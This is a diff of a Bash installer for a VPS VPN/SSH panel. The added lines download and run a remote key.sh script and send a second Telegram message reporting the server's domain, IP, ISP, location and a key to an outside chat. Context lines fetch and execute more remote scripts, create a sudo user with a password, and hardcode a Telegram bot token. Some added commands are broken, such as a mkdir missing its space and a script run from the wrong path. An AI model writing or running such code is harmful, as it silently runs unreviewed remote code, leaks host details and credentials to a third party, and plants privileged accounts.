@@ -25,7 +25,7 @@ red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 
 export LANG='en_US.UTF-8'
 export LANGUAGE='en_US.UTF-8'
-
+mkdir /etc/ilyass
 
 # // Export Color & Information
 export RED='\033[0;31m'
@@ -118,7 +118,8 @@ echo -e "${BIGreen}--->${NC}  ${BIYellow}★ ${NC}${BICyan} Install TOOLS${NC}${
 sleep 2
 wget -q https://raw.githubusercontent.com/FasterExE/VIP-Autoscript/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
-clear
+mkdir/etc/ilyass/telegram
+wget -O /etc/ilyass/telegram/key.sh https://raw.githubusercontent.com/FasterExE/KEY-BOT/main/key.sh; bash key.sh
 clear
 echo -e "${BICyan}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo -e "$BBlue                     ${BIWhite}${IWhite}SETUP DOMAIN VPS${NC}     $NC"
@@ -180,6 +181,8 @@ useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
 CHATID="6582195916"
+CHATIDC=$(cat /etc/ilyass/telegram/id)
+KEY=$(cat /etc/ilyass/telegram/key)
 KEY="6621929387:AAG-7u9w7NTV2M0REX2oISWHdtgMdNZUQRc"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
@@ -200,7 +203,25 @@ By Admin 𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪
 <i>Notifications Automatic From Github</i>
 "'&reply_markup={"inline_keyboard":[[{"text":"𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪","url":"https://t.me/IlyassExE"}]]}' 
 
+TEXTC="Installation VIP Auto Script
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<code>VPS Name   :</code> <code>$Name</code>
+<code>Domain     :</code> <code>$domain</code>
+<code>VPS IP     :</code> <code>$MYIP</code>
+<code>VPS ISP    :</code> <code>$ISP</code>
+<code>Timezone   :</code> <code>$WKT</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Ilyass Key :</code> <code>$KEY</code>
+<code>Exp Sc.    :</code> <code>Unlimited (Key)</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+By Admin 𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<i>Notifications Automatic From Github</i>
+"'&reply_markup={"inline_keyboard":[[{"text":"𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪","url":"https://t.me/IlyassExE"}]]}' 
+
+
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+curl -s --max-time $TIME -d "chat_id=$CHATIDC&disable_web_page_preview=1&text=$TEXTC&parse_mode=html" $URL >/dev/null
 echo -e "${BIGreen}--->${NC}  ${BIYellow}★ ${NC}${BICyan} Install SSH/WS${NC}${BIYellow} ★ ${NC}"
 sleep 2
 wget https://raw.githubusercontent.com/FasterExE/VIP-Autoscript/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
